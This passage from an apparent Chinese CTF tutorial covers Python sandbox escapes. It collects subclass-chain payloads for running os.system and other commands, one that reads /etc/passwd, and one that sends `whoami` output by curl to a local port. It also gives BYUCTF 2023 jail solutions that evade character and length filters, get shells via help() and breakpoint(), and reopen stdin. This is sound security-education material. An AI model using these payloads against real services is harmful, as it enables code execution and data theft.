class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed  </span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></div><ol><li>沙箱首先获取  <code>__builtins__</code> ，然后依据现有的  <code>__builtins__</code>  来构建命名空间。</li><li>修改  <code>__import__</code>  函数为自定义的 <code>_hook_import_</code></li><li>删除 open 函数防止文件操作</li><li>exec 命令。</li></ol><p>绕过方式：</p><p>由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的  <code>__builtins__</code> （这个 <code>__builtins__</code> 保存的就是原始 <code>__builtins__</code> 的引用），比如 types 库，来执行任意命令：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;string&#x27;</span>).__builtins__</span><br></pre></td></tr></table></figure></div><h4 id="完全限制no-builtins"><a class="markdownIt-Anchor" href="#完全限制no-builtins">#</a> 完全限制 (no builtins)</h4><p>如果沙箱完全清空了  <code>__builtins__</code> , 则无法使用 import, 如下：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: <span class="built_in">__import__</span> <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure></div><p>这种情况下我们就需要利用 python 继承链来绕过，其步骤简单来说，就是通过 python 继承链获取内置类，然后通过这些内置类获取到敏感方法例如 os.system 然后再进行利用。</p><p><a class="link" href="https://xz.aliyun.com/t/2308?time__1311=n4%2BxnieDqWqYq7KYBKDsf3ObzDkQKQ11DBQoD">用 python 继承链搞事情 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>具体原理可见：<a class="link" href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals">Python 沙箱逃逸小结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>常见的一些 payload 如下:</p><h5 id="rce-2"><a class="markdownIt-Anchor" href="#rce-2">#</a> RCE</h5><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess </span></span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;Popen&#x27;</span>][<span class="number">0</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># builtins</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># help</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&#x27;help&#x27;</span>]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#commands (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;commands&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;commands&quot;</span>].getoutput(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pty (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pty&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pty&quot;</span>].spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#importlib</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#imp</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pdb</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pdb&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pdb&quot;</span>].os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctypes</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiprocessing</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;curl localhost:9999/?a=`whoami`&#x27;</span>)).start()</span><br></pre></td></tr></table></figure></div><h5 id="file"><a class="markdownIt-Anchor" href="#file">#</a> File</h5><p>操作文件可以使用 builtins 中的 open，也可以使用 FileLoader 模块的 get_data 方法。</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;FileLoader&quot;</span> ][<span class="number">0</span>].get_data(<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="绕过长度限制"><a class="markdownIt-Anchor" href="#绕过长度限制">#</a> 绕过长度限制</h3><p>BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).sub(<span class="string">r&#x27;[a-z0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">input</span>(<span class="string">&quot;code &gt; &quot;</span>).lower()))[:<span class="number">130</span>])</span><br></pre></td></tr></table></figure></div><p>题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">116</span>,<span class="number">120</span>,<span class="number">116</span>])).read())</span><br></pre></td></tr></table></figure></div><p>函数名比较好绕过，直接使用 unicode。数字也可以使用 ord 来获取然后进行相减。我这里选择的是 chr (333).</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># f = 102 = 333-231 = ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;)</span></span><br><span class="line"><span class="comment"># a = 108 = 333-225 = ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;)</span></span><br><span class="line"><span class="comment"># l = 97 = 333-236 = ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;)</span></span><br><span class="line"><span class="comment"># g = 103 = 333-230 = ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;)</span></span><br><span class="line"><span class="comment"># . = 46 = 333-287 = ord(&#x27;ō&#x27;)-ord(&#x27;ğ&#x27;)</span></span><br><span class="line"><span class="comment"># t = 116 = 333-217 = ord(&#x27;ō&#x27;)-ord(&#x27;Ù&#x27;)</span></span><br><span class="line"><span class="comment"># x = 120 = = 333-213 = ord(&#x27;ō&#x27;)-ord(&#x27;Õ&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ç&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;á&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ì&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;æ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ğ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ù&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Õ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ù&#x27;</span>)])).read())</span><br></pre></td></tr></table></figure></div><p>但这样的话其实长度超出了限制。而题目的 eval 表示不支持分号；，这种情况下，我们可以添加一个 exec。然后将 ord 以及不变的  <code>a('ō')</code>  进行替换。这样就可以构造一个满足条件的 payload</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;a=ord;b=a(&#x27;ō&#x27;);print(open(bytes([b-a(&#x27;ç&#x27;),b-a(&#x27;á&#x27;),b-a(&#x27;ì&#x27;),b-a(&#x27;æ&#x27;),b-a(&#x27;ğ&#x27;),b-a(&#x27;Ù&#x27;),b-a(&#x27;Õ&#x27;),b-a(&#x27;Ù&#x27;)])).read())&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>但其实尝试之后发现这个 payload 会报错，原因在于其中的某些 unicode 字符遇到 lower () 时会发生变化，避免 lower 产生干扰，可以在选取 unicode 时选择 ord 值更大的字符。例如 chr (4434)</p><p>当然，可以直接使用 input 函数来绕过长度限制。</p><h4 id="打开-input-输入"><a class="markdownIt-Anchor" href="#打开-input-输入">#</a> 打开 input 输入</h4><p>如果沙箱内执行的内容是通过 input 进行传入的话（不是 web 传参），我们其实可以传入一个 input 打开一个新的输入流，然后再输入最终的 payload，这样就可以绕过所有的防护。</p><p>以 BYUCTF2023 jail a-z0-9 为例：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).sub(<span class="string">r&#x27;[a-z0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">input</span>(<span class="string">&quot;code &gt; &quot;</span>).lower()))[:<span class="number">130</span>])</span><br></pre></td></tr></table></figure></div><p>即使限制了字母数字以及长度，我们可以直接传入下面的 payload（注意是 unicode）<br>()<br> 这段 payload 打开 input 输入后，我们再输入最终的 payload 就可以正常执行。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>打开输入流需要依赖 input 函数，no builtins 的环境中或者题目需要以 http 请求的方式进行输入时，这种方法就无法使用了。</p><p>下面是一些打开输入流的方式:</p><h5 id="sysstdinread"><a class="markdownIt-Anchor" href="#sysstdinread">#</a> sys.stdin.read()</h5><p>注意输入完毕之后按 ctrl+d 结束输入</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.read())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">kali</span><br><span class="line"><span class="number">0</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></div><h5 id="sysstdinreadline"><a class="markdownIt-Anchor" href="#sysstdinreadline">#</a> sys.stdin.readline()</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readline())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h5 id="sysstdinreadlines"><a class="markdownIt-Anchor" href="#sysstdinreadlines">#</a> sys.stdin.readlines()</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readlines()[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>在 python2 中，在 python 2 中，input 函数从标准输入接收输入之后会自动 eval 求值。因此无需在前面加上 eval。但 raw_input 不会自动 eval。</p><h4 id="breakpoint-函数"><a class="markdownIt-Anchor" href="#breakpoint-函数">#</a> breakpoint 函数</h4><p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p><p>在输入 breakpoint () 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p><h3 id="help-函数"><a class="markdownIt-Anchor" href="#help-函数">#</a> help 函数</h3><p>help 函数可以打开帮助文档。索引到 os 模块之后可以打开 sh</p><p>当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助</p><p>然后输入 os, 此时会进入 os 的帮助文档。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help&gt; os</span><br></pre></td></tr></table></figure></div><p>然后在输入  <code>!sh</code>  就可以拿到 /bin/sh, 输入  <code>!bash</code>  则可以拿到 /bin/bash</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">help&gt; os</span><br><span class="line">$ ls</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><h3 id="绕过多行限制"><a class="markdownIt-Anchor" href="#绕过多行限制">#</a> 绕过多行限制</h3><p>绕过多行限制的利用手法通常在限制了单行代码的情况下使用，例如 eval, 中间如果存在；或者换行会报错。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;);print(1)&quot;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>);<span class="built_in">print</span>(<span 